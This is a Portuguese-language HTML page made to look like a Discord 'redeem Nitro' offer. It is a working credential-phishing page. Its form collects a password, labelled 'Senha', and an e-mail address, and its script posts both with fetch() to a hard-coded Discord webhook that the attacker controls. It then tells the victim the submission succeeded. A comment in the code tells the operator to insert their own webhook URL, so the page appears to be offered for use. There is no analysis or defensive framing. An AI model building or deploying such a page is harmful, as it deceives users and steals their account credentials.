<!DOCTYPE html>
<html>
<head>
  <title>Resgatar Nitro</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #36393f;
    }
    
    .button {
      position: relative;
      width: 250px;
      height: 80px;
      background-color: #7289da;
      border-radius: 40px;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      cursor: pointer;
      overflow: hidden;
      transition: background-color 0.3s ease;
    }
    
    .button:before {
      content: "";
      position: absolute;
      width: 150px;
      height: 80px;
      background-color: #7289da;
      border-radius: 50%;
      transform: translateX(-50%);
      left: 50%;
      top: -50%;
      transition: top 0.3s ease;
    }
    
    .button:hover {
      background-color: #677bc4;
    }
    
    .button:hover:before {
      top: -30px;
    }
    
    .button__text {
      color: #fff;
      font-size: 20px;
      font-weight: bold;
      text-transform: uppercase;
    }
    
    #data-form {
      margin-top: 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    
    #data-form input {
      margin-bottom: 10px;
      padding: 8px;
      border-radius: 4px;
      border: none;
    }
    
    #submit-button {
      width: 100px;
      background-color: #7289da;
      color: #fff;
      border: none;
      border-radius: 4px;
      padding: 8px;
      cursor: pointer;
    }
    
    #submit-button:hover {
      background-color: #677bc4;
    }
  </style>
</head>
<body>
   <div class="button" id="nitro-button">
    <div class="button__text">Obter Nitro</div>
  </div>

  <form id="data-form">
    <input type="text" id="name-input" placeholder="Senha">
    <input type="email" id="email-input" placeholder="E-mail">
    <button type="submit" id="submit-button">Resgatar</button>
  </form>

<script>
  // Substitua "WEBHOOK_URL" pela URL do seu webhook do Discord
  const webhookURL = "https://discord.com/api/webhooks/1113703626624471110/ujdBy3q8-T8njb4OJXQL_LProhN9G9vuWmcXmSszs9wGUJaN-j-ddErxPn7uOc7djhOf";

  const form = document.getElementById("data-form");
  const nameInput = document.getElementById("name-input");
  const emailInput = document.getElementById("email-input");

  form.addEventListener("submit", (e) => {
    e.preventDefault();

    const name = nameInput.value;
    const email = emailInput.value;

    const data = {
      content: `Novo envio:\nNome: ${name}\nE-mail: ${email}`,
    };

    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })
      .then(() => {
        alert("Dados enviados com sucesso!");
        nameInput.value = "";
        emailInput.value = "";
      })
      .catch((error) => {
        console.error("Erro ao enviar os dados:", error);
        alert("Ocorreu um erro ao enviar os dados.");
      });
  });
</script>
